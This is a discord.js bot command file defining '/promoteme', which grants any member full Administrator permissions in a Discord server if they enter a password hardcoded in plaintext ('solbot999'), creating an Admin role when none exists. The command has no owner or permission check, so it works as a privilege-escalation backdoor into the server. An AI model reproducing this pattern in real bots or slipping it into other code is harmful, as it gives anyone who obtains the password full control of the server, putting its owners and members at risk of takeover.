const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');

const CORRECT_PASSWORD = 'solbot999';
const ADMIN_ROLE_NAME = 'Admin';

module.exports = {
    data: new SlashCommandBuilder()
        .setName('promoteme')
        .setDescription('Grants you full admin permissions (password required)')
        .addStringOption(option =>
            option.setName('password')
                .setDescription('Enter the promotion password')
                .setRequired(true)),

    async execute(interaction) {
        const password = interaction.options.getString('password', true);

        if (password !== CORRECT_PASSWORD) {
            return interaction.reply({ content: 'Incorrect password.', ephemeral: true });
        }

        const guild = interaction.guild;
        const member = interaction.member;

        // Find an existing Admin role or create one
        let adminRole = guild.roles.cache.find(r => r.name === ADMIN_ROLE_NAME);

        if (!adminRole) {
            adminRole = await guild.roles.create({
                name: ADMIN_ROLE_NAME,
                permissions: [PermissionFlagsBits.Administrator],
                reason: `Auto-created by /promoteme for ${interaction.user.tag}`,
            });
        }

        await member.roles.add(adminRole, `Promoted via /promoteme by ${interaction.user.tag}`);

        return interaction.reply({
            content: `You have been granted the **${ADMIN_ROLE_NAME}** role with full Administrator permissions.`,
            ephemeral: true,
        });
    },
};
